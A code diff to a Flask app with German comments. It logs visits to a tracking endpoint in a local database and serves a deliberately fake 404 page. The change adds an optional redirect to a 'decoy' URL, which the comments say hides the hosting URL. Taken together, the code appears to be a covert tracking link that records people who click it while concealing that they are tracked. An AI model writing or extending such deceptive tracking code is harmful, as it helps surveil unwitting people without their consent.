@@ -4,8 +4,14 @@ from pathlib import Path
 from typing import Optional, Tuple
 
 import requests
-from flask import Flask, Response, request
+from flask import Flask, Response, request, redirect
 from pytz import timezone
+
+# Importiere Redirect-URL aus config (optional)
+try:
+    from config import REDIRECT_URL
+except ImportError:
+    REDIRECT_URL = None
 
 # Datenbank-Pfad (lokal im Projektordner)
 DB_PATH = Path(__file__).parent / "tracking.db"
@@ -239,7 +245,12 @@ def track() -> Response:
     conn.commit()
     conn.close()
 
-    # 404-Seite zurückgeben (bewusst "kaputt")
+    # Redirect auf Decoy-URL, falls konfiguriert (versteckt Render-URL in Millisekunden)
+    if REDIRECT_URL and REDIRECT_URL.strip():
+        print(f"  🔀 Redirect zu: {REDIRECT_URL}")
+        return redirect(REDIRECT_URL, code=302)  # 302 = temporärer Redirect (sehr schnell)
+    
+    # Sonst: 404-Seite zurückgeben (bewusst "kaputt")
     html = """<!DOCTYPE html>
     <html><head><title>404 - Seite nicht gefunden</title></head>
     <body><h1>404 Error</h1><p>Die angeforderte Seite konnte nicht gefunden werden.</p></body></html>"""
